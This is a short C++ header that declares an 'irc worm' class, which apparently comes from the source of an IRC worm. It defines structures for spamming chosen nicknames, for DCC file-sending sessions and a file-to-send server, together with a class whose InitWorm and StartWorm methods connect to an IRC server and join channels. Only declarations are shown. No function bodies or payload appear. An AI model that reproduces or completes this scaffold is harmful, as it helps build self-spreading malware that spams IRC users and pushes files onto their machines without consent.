#include "stdafx.h"
#include "winsock2.h"

/* irc worm class defination */

#ifndef xIrcWorm__H

	#define xIrcWorm__H

typedef struct xSpamInfo {
	SOCKET xsocket;
	char   nick2spam[20];
	BOOL   AutoSpam;
	char   Oip[25];
	BOOL   OveRideIp;
}SpamInfo;


typedef struct xDccInfo {
	SOCKET xsocket;
	char   xNick[20];
	char   Oip[25];
	BOOL   OveRideIp;
}DCCInfo;

typedef struct DccServerInfo {
	int  port;
	char FileToSend[MAX_PATH];
	void *FileSending;
}DCC_SERVER_INFO;

	class xIrcWorm
	{
	private:
		SOCKET	Irc_Socket;
		int		Irc_Port;
		char	Irc_Server[70];
		char	Nick[20],User[20],RealName[40];
		char	buffer[8192];


		char	channels_list[75][30];
		int		number_of_channels;

		BOOL	OverRideIP;
		char	xIp[25];

		int		myrecv(BOOL GetLine);

	public:

		void	InitWorm(char IrcServer[],int port);
		BOOL	StartWorm();
	};

#endif